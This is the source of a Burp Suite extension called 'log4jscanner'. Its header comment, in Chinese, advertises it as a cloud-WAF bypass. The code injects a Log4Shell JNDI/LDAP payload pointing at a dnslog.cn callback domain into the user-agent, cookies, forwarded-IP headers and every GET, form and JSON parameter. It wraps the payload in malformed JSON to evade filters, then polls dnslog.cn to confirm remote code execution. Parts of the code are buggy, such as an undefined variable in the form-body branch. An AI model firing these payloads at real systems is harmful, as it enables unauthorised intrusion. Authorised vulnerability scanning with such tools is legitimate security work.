# /usr/bin/env python
# _*_ coding:utf-8 _*_
# 绕云waf版本 1.3
__author__ = 'f0ng'

from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory
import sys
import time
import os
import re
import requests
from hashlib import md5
import random
import urllib
import json

# 扫描过的host集
finish_set = set()

def randmd5():
    new_md5 = md5()
    new_md5.update(str(random.randint(1, 1000)))
    return new_md5.hexdigest()[:6]


class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        print("[+] #####################################")
        print("[+]     log4jscanner")
        print("[+]     Author:   f0ng")
        print("[+] #####################################\r\n\r\n")
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName('log4jscanner')
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        
        # if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:
        if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:
            # 监听Response
            if not messageIsRequest:

                '''请求数据'''
                # 获取请求包的数据
                resquest = messageInfo.getRequest()
                analyzedRequest = self._helpers.analyzeRequest(resquest)
                request_header = analyzedRequest.getHeaders()
                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()

                # 请求方法
                reqMethod = analyzedRequest.getMethod()

                '''响应数据'''
                # 获取响应包数据
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(response)  # returns IResponseInfo
                response_headers = analyzedResponse.getHeaders()
                request_host, request_Path = self.get_request_host(request_header)
                response_bodys = response[analyzedResponse.getBodyOffset():].tostring()
                response_statusCode = analyzedResponse.getStatusCode()
                expression = r'.*(application/json).*'
                for rpheader in response_headers:
                    if (rpheader.startswith("Content-Type:") or rpheader.startswith("content-type:")) and re.match(expression, rpheader):
                        response_is_json = True

                # 获取服务信息
                httpService = messageInfo.getHttpService()
                port = httpService.getPort()
                host = httpService.getHost()

                uri = request_Path.split("?")

                if ".jpg" in uri[0] or ".png" in uri[0] or ".jpeg" in uri[0] or ".js" in uri[0] or ".css" in uri[0] or ".mp4" in uri[0]:
                    pass

                if len(uri) > 1:
                    request_uri = uri[1]
                else :
                    request_uri = uri[0]
                
                headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',}
                # r_first = requests.get("https://log.xn--9tr.com/new_gen",headers=headers)
                # r_h = re.findall( r'"token":"(.*?)"', str(r_first.text))
                # headers["Cookie"] = "token=s4l47096z93e" 
                # payload = re.findall(r'"domain":"(.*?).",' , str(r_first.text))
                # payload_dnslog = "948ea3b7.dns.1433.eu.org"
                r_first = requests.get("http://dnslog.cn/getdomain.php",headers=headers)
                r_h = re.findall( r'PHPSESSID=(.*?);', str(r_first.headers))
                headers["Cookie"] = "PHPSESSID=" + r_h[0]
                payload_dnslog = str(r_first.content)
                randomStr = randmd5()
                randomStr = randmd5()
                vulnurl = '${jndi:ldap://' + str(randomStr)  + str(host) + '.' + payload_dnslog + '/exp}'
                lists= ['{,,"":"",,,"a":/*111*/"'+ vulnurl +'"}']
                
                request_header = self.set_request_ua(request_header,vulnurl)

                request_header.add("Forwarded-For-Ip: 127.0.0.1" + vulnurl)
                request_header.add("Forwarded-For: 127.0.0.1" +  vulnurl)
                request_header.add("Forwarded: 127.0.0.1" + vulnurl)
                request_header.add("X-Client-IP: 127.0.0.1 "+ vulnurl)


                # 判断请求方法为非POST，且与已报告的host+uri不重复
                if reqMethod == 'POST' or reqMethod == 'PUT' and (str(host) + str(request_uri)) not in finish_set :
                    request_bodys = urllib.unquote(request_bodys)

                    if  "=" in request_bodys or '":' in request_bodys :

                        for payload  in lists:

                            # 默认payload即可解决a=1&b=2&c=3的情况 已完成
                            newBodyPayload = payload
                            if  "=" in request_bodys and "{" not in request_bodys:
                                a = request_bodys.split("=")
                                total = ""
                                for i in range(len(b)):
                                    c = b[i].split("=")
                                    pay = c[0] + "=" + newBodyPayload
                                    total = total + pay + "&"

                                newBodyPayload = total.strip("&")

                            # 处理请求为正常json请求 {“a":"1","b":"22222"} 已完成
                            if '{' in request_bodys and "=" not in request_bodys:
                                single = json.loads(request_bodys)
                                # print(single)
                                for cc in single.keys():
                                    single[cc] = newBodyPayload

                                newBodyPayload = json.dumps(str(single))

                            # 处理请求里带有正常a=1&param={“a":"1","b":"22222"}
                            if "={" in request_bodys:
                                a = request_bodys.split("&")
                                total = ""
                                for i in range(len(a)):
                                    # print(i)
                                    c = a[i].split("=")
                                    if "{" in c[1]:
                                        single = json.loads(c[1])
                                        for cc in single.keys():
                                            single[cc] = vulnurl
                                        total = total + c[0] + "=" + str(json.dumps(single)) + "&"
                                    else:
                                        pay = c[0] + "=" + vulnurl
                                        total = total + pay + "&"
                                
                                newBodyPayload = total.strip("&").replace(" ","").replace("'",'"')
                                
                            #处理请求里带有{"params":{"a":"1","b":"22222"}}
                            if '":"{' in request_bodys  :
                                single2 = json.loads(request_bodys)
                                for cc in single2.keys():
                                    if "{" not in str(single2[cc]): # 没问题
                                        single2[cc] = vulnurl

                                    else :
                                        # print("111" + str(single2[cc]))
                                        test = str(single2[cc]).strip("{").strip("}").replace("'",'"')
                                        test_lists = test.split(",") # 把json里的根据逗号分割开
                                        test_lists_total = "{"
                                        for i in range(len(test_lists)):
                                            test_lists_single = test_lists[i].split(":")

                                            if '"' in test_lists_single[1]:
                                                test_lists_single[1] = '"' + vulnurl +  '"'

                                            # else : # 没有加双引号的忽略
                                            #     test_lists_single[1] = vulnurl

                                            test_lists_total = test_lists_total + test_lists_single[0] + ":" + test_lists_single[1] + ","

                                        single2[cc] = test_lists_total.strip(",") + "}"
                                        # print(single2[cc])

                                newBodyPayload = str(single2).replace(" ","").replace("'",'"').replace('"{',"{").replace('"}"','}"').replace('{u"','{"').replace(',u"',',"')


                            newBody = self._helpers.stringToBytes(newBodyPayload)
                            newRequest = self._helpers.buildHttpMessage(request_header, newBody)
                            
                            ishttps = False
                            expression = r'.*(443).*'
                            if re.match(expression, str(port)):
                                ishttps = True
                            rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                            
                            r = requests.get("http://dnslog.cn/getrecords.php",headers=headers)

                            r_hh = re.search( r'(.*?) HTTP/', str(request_header), re.M|re.I)

                            # 加入到扫描过的集合
                            finish_set.add( str(host) + str(request_uri) )

                            if ((randomStr in r.content) and (host in r.content) and (r.status_code == 200)):

                                issue = CustomIssue(
                                BasePair=messageInfo,
                                IssueName='Log4j RCE',
                                IssueDetail='addScanIssue Testing',
                                Severity='High',
                                Confidence='Certain')
                                self._callbacks.addScanIssue(issue)                   
                                messageInfo.setHighlight('red')
                                print("\t[+] Target vulnerability")
                                print("\t[-] host:" + str(host))
                                print("\t[-] port:" + str(port))
                                print("\t[-] playload:" + str(newBodyPayload) )
                                print("\t[-] 方法以及路径:" + r_hh.group(1) + "\r\n")


                # 判断请求方法为非POST，且与已报告的host+uri不重复
                elif(reqMethod != 'POST' and (str(host) + str(request_uri)) not in finish_set) :

                    r_hh = re.findall( r'\?(.*?) HTTP/', str(request_header), re.M|re.I)
                    
                    if len(r_hh) > 0:
                        request_uri = r_hh[0]
                        if "=" in request_uri :
                            request_uri_0 = request_header[0]
                            for payload  in lists:
                                newBodyPayload = payload

                                b = request_uri.split("&")
                                total = ""
                                for i in range(len(b)):
                                    c = b[i].split("=")
                                    pay = c[0] + "=" + newBodyPayload
                                    total = total + pay + "&"

                                request_header[0] = request_uri_0.replace(request_uri,total)

                                newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)

                                ishttps = False
                                expression = r'.*(443).*'
                                if re.match(expression, str(port)):
                                    ishttps = True
                                rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                                r = requests.get("http://dnslog.cn/getrecords.php",headers=headers)

                                r_hh = re.search( r'(.*?) HTTP/', str(request_header), re.M|re.I)

                                # 加入到扫描过的集合
                                finish_set.add( str(host) + str(request_uri) )

                                if ((randomStr in r.content) and (host in r.content) and (r.status_code == 200)):
                                    issue = CustomIssue(
                                    BasePair=messageInfo,
                                    IssueName='Log4j RCE',
                                    IssueDetail='addScanIssue Testing',
                                    Severity='High',
                                    Confidence='Certain')                        
                                    messageInfo.setHighlight('red')
                                    
                                    print("\t[+] Target vulnerability")
                                    print("\t[-] host:" + str(host))
                                    print("\t[-] port:" + str(port))
                                    print("\t[-] playload:" + str(newBodyPayload) )
                                    print("\t[-] 方法以及路径:" + r_hh.group(1) + "\r\n")


                    else:
                        pass

    # 获取请求的contenttype
    def get_request_contenttype(self, reqHeaders):
        for _ in reqHeaders:
            if "Content-Type:" in _:
                host_list = _.split(':')

        contenttype = host_list[1].strip()

        return contenttype


    # 更改请求的ua头
    def set_request_ua(self, reqHeaders,vulnurl):

        for _ in range(len(reqHeaders)):
            if "User-Agent:" in reqHeaders[_]:
                reqHeaders[_] = "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0" + vulnurl.strip()
            
            if "Cookie" in reqHeaders[_] or "cookie" in reqHeaders[_]:
                cookie_total = ""
                cookie = reqHeaders[_].replace("Cookie:","").replace("cookie","")
                cookie_lists = cookie.split(";")
                for i in cookie_lists:
                    single_cookie = i.split("=")
                    cookie_total = cookie_total + single_cookie[0] + "=" +vulnurl +"; "
                
                reqHeaders[_] = "Cookie: " + cookie_total

        
        return reqHeaders


    # 获取请求的host , uri
    def get_request_host(self, reqHeaders):
        uri = reqHeaders[0].split(' ')[1]
        for _ in reqHeaders:
            if "Host:" in _:
                host_list = _.split(':')

        host = host_list[1].strip()
        return host, uri

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedIRequestInfo = self._helpers.analyzeRequest(request)
        reqHeaders = analyzedIRequestInfo.getHeaders()
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()
        reqMethod = analyzedIRequestInfo.getMethod()
        reqParameters = analyzedIRequestInfo.getParameters()
        reqHost, reqPath = self.get_request_host(reqHeaders)
        reqContentType = analyzedIRequestInfo.getContentType()
        # print(reqHost, reqPath)
        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedIResponseInfo = self._helpers.analyzeRequest(response)
        resHeaders = analyzedIResponseInfo.getHeaders()
        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        # resStatusCode = analyzedIResponseInfo.getStatusCode()
        return resHeaders, resBodys

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        return host, port, protocol

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        pass

    def doPassiveScan(self, baseRequestResponse):
        self.issues = []
        self.start_run(baseRequestResponse)
        return self.issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        '''
        相同的数据包，只报告一份报告
        :param existingIssue:
        :param newIssue:
        :return:
        '''

        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():
            return -1

        return 0

class CustomIssue(IScanIssue):
    def __init__(self, BasePair, Confidence='Certain', IssueBackground=None, IssueDetail=None, IssueName='Python Scripter generated issue', RemediationBackground=None, RemediationDetail=None, Severity='High'):
        self.HttpMessages=[BasePair]
        self.HttpService=BasePair.getHttpService()
        self.Url=BasePair.getUrl() 
        self.Confidence = Confidence
        self.IssueBackground = IssueBackground 
        self.IssueDetail = IssueDetail
        self.IssueName = IssueName
        self.IssueType = 134217728 
        self.RemediationBackground = RemediationBackground 
        self.RemediationDetail = RemediationDetail 
        self.Severity = Severity 

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService

    def getUrl(self):
        return self.Url

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return self.IssueBackground

    def getIssueDetail(self):
        return self.IssueDetail

    def getIssueName(self):
        return self.IssueName

    def getIssueType(self):
        return self.IssueType

    def getRemediationBackground(self):
        return self.RemediationBackground

    def getRemediationDetail(self):
        return self.RemediationDetail

    def getSeverity(self):
        return self.Severity